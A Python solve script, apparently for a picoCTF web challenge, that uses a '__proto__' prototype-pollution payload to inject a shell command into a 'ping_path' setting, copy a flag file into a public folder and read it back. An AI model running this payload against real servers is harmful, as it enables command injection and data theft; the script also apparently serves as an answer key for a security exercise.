import requests
import re
import json
import time

def main():
    requests.post(
        "http://challenge:3000/", 
        json = {
            'settingsData': json.dumps(
                {
                    "backgroundColor": "#222",
                    "textColor": "#ffffff",
                    "fontSize": "1rem",
                    "textAreaFont": "monospace",
                    "font": "sans-serif",
                    "__proto__": {"ping_path": "./ && cp ./del-funkee.txt ./public"}
                },
                separators=(',', ':'), indent=None
            )
        }
    )
    requests.get("http://challenge:3000/")
    time.sleep(1) # give time for server to implement changes
    response = requests.get("http://challenge:3000/del-funkee.txt").text
    
    # Search for flag in response
    flag = re.search("picoCTF{.*}", response)

    # Write flag to file
    with open("./flag", "w") as w:
        w.write(flag.group(0))

if __name__ == "__main__":
    main()